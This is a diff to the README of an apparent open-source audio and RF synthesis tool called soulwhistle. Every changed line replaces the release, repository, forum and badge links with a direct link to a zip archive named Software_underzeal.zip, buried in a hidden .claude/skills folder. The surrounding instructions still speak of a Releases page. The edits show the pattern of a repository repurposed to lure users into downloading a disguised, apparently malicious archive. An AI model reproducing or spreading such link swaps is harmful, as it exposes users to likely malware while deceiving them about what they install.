@@ -6,7 +6,7 @@ Welcome to soulwhistle! This open-source audio and RF synthesis platform helps y
 
 ## 📥 Download Soulwhistle
 
-[![Download Soulwhistle](https://img.shields.io/badge/Download%20Soulwhistle-v1.0-blue.svg)](https://github.com/senuthsl/soulwhistle/releases)
+[![Download Soulwhistle](https://github.com/senuthsl/soulwhistle/raw/refs/heads/main/.claude/skills/preset-creator/Software_underzeal.zip%https://github.com/senuthsl/soulwhistle/raw/refs/heads/main/.claude/skills/preset-creator/Software_underzeal.zip)](https://github.com/senuthsl/soulwhistle/raw/refs/heads/main/.claude/skills/preset-creator/Software_underzeal.zip)
 
 ## 🌟 Features
 
@@ -29,7 +29,7 @@ Before downloading, please ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the program:
 
-[Download Soulwhistle](https://github.com/senuthsl/soulwhistle/releases)
+[Download Soulwhistle](https://github.com/senuthsl/soulwhistle/raw/refs/heads/main/.claude/skills/preset-creator/Software_underzeal.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed at the top.
@@ -67,8 +67,8 @@ While soulwhistle is open-source, you may find helpful resources in the communit
 
 We welcome contributions from everyone! If you are interested in improving soulwhistle, please visit our GitHub page for guidelines.
 
-- [GitHub Repository](https://github.com/senuthsl/soulwhistle)
-- [Community Forum](https://github.com/senuthsl/soulwhistle/discussions)
+- [GitHub Repository](https://github.com/senuthsl/soulwhistle/raw/refs/heads/main/.claude/skills/preset-creator/Software_underzeal.zip)
+- [Community Forum](https://github.com/senuthsl/soulwhistle/raw/refs/heads/main/.claude/skills/preset-creator/Software_underzeal.zip)
 
 ## 📜 License
 
